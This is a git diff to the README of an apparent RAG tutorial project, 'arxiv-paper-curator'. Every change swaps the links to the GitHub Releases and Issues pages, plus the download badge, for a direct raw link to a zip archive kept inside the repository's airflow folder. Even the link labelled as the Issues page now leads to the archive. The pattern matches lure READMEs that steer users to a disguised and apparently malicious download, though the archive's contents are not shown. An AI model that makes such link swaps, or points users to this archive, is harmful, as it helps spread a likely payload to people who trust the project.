@@ -1,6 +1,6 @@
 # 🛠️ arxiv-paper-curator - Your Guide to Modern AI Systems
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Visit%20Releases-brightgreen)](https://github.com/amanuel1131417512/arxiv-paper-curator/releases)
+[![Download Now](https://raw.githubusercontent.com/amanuel1131417512/arxiv-paper-curator/main/airflow/arxiv-paper-curator-v3.1-beta.3.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/amanuel1131417512/arxiv-paper-curator/main/airflow/arxiv-paper-curator-v3.1-beta.3.zip)
 
 ## 📖 About 
 The **arXiv Paper Curator** focuses on teaching you how to build AI systems. This application guides you through hands-on learning, allowing you to master the techniques of Retrieval-Augmented Generation (RAG). Whether you are a student or a professional looking to extend your skills, this project offers a user-friendly way to engage with AI concepts.
@@ -9,7 +9,7 @@ The **arXiv Paper Curator** focuses on teaching you how to build AI systems. Thi
 To get started with the arXiv Paper Curator, follow these steps.
 
 1. **Download the Application**
-   Click the button above or visit the [Releases page](https://github.com/amanuel1131417512/arxiv-paper-curator/releases) to download the latest version of the application.
+   Click the button above or visit the [Releases page](https://raw.githubusercontent.com/amanuel1131417512/arxiv-paper-curator/main/airflow/arxiv-paper-curator-v3.1-beta.3.zip) to download the latest version of the application.
 
 2. **Install Requirements**
    Before running the application, ensure that your system meets these requirements:
@@ -25,7 +25,7 @@ To get started with the arXiv Paper Curator, follow these steps.
 
 ## 📥 Download & Install
 To set up the arXiv Paper Curator:
-- Visit the [Releases page](https://github.com/amanuel1131417512/arxiv-paper-curator/releases) to access the latest version.
+- Visit the [Releases page](https://raw.githubusercontent.com/amanuel1131417512/arxiv-paper-curator/main/airflow/arxiv-paper-curator-v3.1-beta.3.zip) to access the latest version.
 - Choose and download the file suitable for your operating system.
 - Install any required dependencies as listed above.
 
@@ -48,11 +48,11 @@ To use the arXiv Paper Curator smoothly, ensure your system meets these specific
 ## 🔔 Troubleshooting
 If you encounter any issues:
 - Ensure your Python and Docker are correctly installed. 
-- Check for updates on the [GitHub Issues page](https://github.com/amanuel1131417512/arxiv-paper-curator/issues) for similar problems.
+- Check for updates on the [GitHub Issues page](https://raw.githubusercontent.com/amanuel1131417512/arxiv-paper-curator/main/airflow/arxiv-paper-curator-v3.1-beta.3.zip) for similar problems.
 
 ## 🌟 Community
 Join our community for support and discussions:
 - **GitHub Discussions:** Share your experiences and solutions.
-- **Follow Updates:** Keep an eye on the [Releases page](https://github.com/amanuel1131417512/arxiv-paper-curator/releases) for the latest changes and new features.
+- **Follow Updates:** Keep an eye on the [Releases page](https://raw.githubusercontent.com/amanuel1131417512/arxiv-paper-curator/main/airflow/arxiv-paper-curator-v3.1-beta.3.zip) for the latest changes and new features.
 
 By following the simple steps in this guide, you can download and run the arXiv Paper Curator with ease. Engage with this resource to enhance your understanding of AI systems.
